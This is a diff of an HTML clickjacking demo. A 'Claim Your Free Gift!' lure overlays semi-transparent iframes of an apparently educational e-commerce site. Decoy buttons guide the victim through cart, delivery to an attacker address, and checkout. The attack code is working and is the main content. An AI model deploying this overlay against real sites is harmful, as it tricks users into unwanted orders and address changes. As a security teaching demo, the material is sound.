@@ -4,90 +4,39 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Multistep Clickjacking Demo</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-        }
-        .container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            text-align: center;
-            z-index: 100;
-            background-color: rgba(255, 255, 255, 0.9);
-        }
-        iframe {
-            position: relative;
-            width: 500px;
-            height: 700px;
-            opacity: 0.5;
-            z-index: 2;
-            display: none;
-            border: none;
-        }
-        #iframe-cart {
-            display: block;
-        }
-        .firstClick, .secondClick, .thirdClick {
-            position: absolute;
-            z-index: 1;
-            font-size: 18px;
-            padding: 10px;
-            color: red;
-            cursor: pointer;
-            font-weight: bold;
-            opacity: 1;
-        }
-        .firstClick {
-            bottom: 20px;
-            right: 20px;
-        }
-        .secondClick {
-            top: 220px;
-            left: 225px;
-        }
-        .thirdClick {
-            bottom: 20px;
-            right: 20px;
-        }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <div class="container">
-        <h1>Claim Your Free Gift!</h1>
-        <p>Click the buttons below to get your exclusive offer!</p>
+<body class="bg-gray-100 font-sans flex items-center justify-center min-h-screen">
+    <div class="container bg-white shadow-lg rounded-lg p-6 max-w-2xl text-center z-10">
+        <h1 class="text-3xl font-bold text-gray-800 mb-4">Claim Your Free Gift!</h1>
+        <p class="text-lg text-gray-600">Click the buttons below to get your exclusive offer!</p>
     </div>
-    <iframe id="iframe-cart" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
-    <iframe id="iframe-delivery" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
-    <iframe id="iframe-checkout" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
-    <div class="firstClick" onclick="nextStep('cart')">Click me first</div>
-    <div class="secondClick" style="display: none;" onclick="nextStep('delivery')">Click me next</div>
-    <div class="thirdClick" style="display: none;" onclick="nextStep('checkout')">Click me last</div>
+    <iframe id="iframe-cart" class="block mx-auto w-[600px] h-[800px] opacity-0.5 z-10" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
+    <iframe id="iframe-delivery" class="hidden mx-auto w-[600px] h-[800px] opacity-0.5 z-10" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
+    <iframe id="iframe-checkout" class="hidden mx-auto w-[600px] h-[800px] opacity-0.5 z-10" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
+    <div class="firstClick fixed bottom-5 right-5 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me first</div>
+    <div class="secondClick hidden fixed top-[220px] left-[225px] z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me next</div>
+    <div class="thirdClick hidden fixed bottom-5 right-5 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me last</div>
     <script>
         let currentStep = 'cart';
 
         function nextStep(step) {
-            document.getElementById(`iframe-${step}`).style.display = 'none';
-            document.getElementById(`${step}Click`).style.display = 'none';
+            document.getElementById(`iframe-${step}`).classList.add('hidden');
+            document.getElementById(`${step}Click`).classList.add('hidden');
 
             if (step === 'cart') {
                 currentStep = 'delivery';
-                document.getElementById('iframe-delivery').style.display = 'block';
-                document.getElementById('secondClick').style.display = 'block';
+                document.getElementById('iframe-delivery').classList.remove('hidden');
+                document.getElementById('secondClick').classList.remove('hidden');
             } else if (step === 'delivery') {
                 currentStep = 'checkout';
-                document.getElementById('iframe-checkout').style.display = 'block';
-                document.getElementById('thirdClick').style.display = 'block';
+                document.getElementById('iframe-checkout').classList.remove('hidden');
+                document.getElementById('thirdClick').classList.remove('hidden');
             } else if (step === 'checkout') {
                 alert('You completed the clickjacking attack!');
             }
         }
     </script>
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93c3eff54aad8bb6',t:'MTc0NjY1NDY3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
